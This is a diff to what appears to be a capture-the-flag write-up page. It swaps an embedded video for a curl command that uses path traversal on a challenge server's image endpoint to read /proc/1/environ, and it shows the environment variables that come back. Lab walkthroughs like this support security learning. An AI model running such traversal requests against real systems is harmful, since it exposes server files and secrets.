@@ -1117,12 +1117,20 @@ to observe the changes within the IDs.</p>
 
 <p>This will give you access to the code.</p>
 
-<div style="padding:56.25% 0 0 0;position:relative;">
-  <iframe src="https://player.vimeo.com/video/499007090" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe>
-</div>
-<script src="https://player.vimeo.com/api/player.js"></script>
+<p>To read the environment variables you can use:</p>
 
-<p>Video description at <a href="https://player.vimeo.com/video/499007090" target="_blank" rel="noopener noreferrer">https://player.vimeo.com/video/499007090</a></p>
+<pre><code class="bash">curl -k -s -L -O 'https://tag-generator.kringlecastle.com/image?id=../../../../../../../../../../../../../../../proc/1/environ'
+cat environ                                                            
+PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cbf2810b7573RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app
+</code></pre>
+
+<p>whereas the value in</p>
+
+<pre><code>proc/x/environ</code></pre>
+
+<p>could be another. Start incrementing from 1.</p>
+
+<p>You have to use the <code class="language-plaintext highlighter-rouge">-O</code> or <code class="language-plaintext highlighter-rouge">--output -</code> because curl assumes a binary.</p>
 
 <p>Solution:</p>
 
